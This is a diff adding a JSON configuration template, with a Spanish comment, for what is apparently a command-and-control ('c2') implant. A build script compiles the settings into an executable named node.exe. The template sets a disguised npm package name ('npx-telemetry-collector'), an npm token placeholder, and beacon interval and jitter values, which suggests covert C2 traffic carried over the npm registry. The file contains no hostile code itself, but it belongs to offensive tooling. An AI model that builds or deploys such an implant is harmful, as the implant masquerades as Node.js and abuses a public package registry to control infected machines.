@@ -1,0 +1,16 @@
+{
+  "_comment": "Copia este fichero a c2.json y rellena package + token. make.py compila dist/node.exe con todo esto dentro.",
+
+  "package": "npx-telemetry-collector",
+
+  "token": "npm_REPLACE_ME",
+
+  "interval": 60,
+  "jitter": 20,
+
+  "name": "node",
+
+  "arch": "both",
+
+  "registry": null
+}
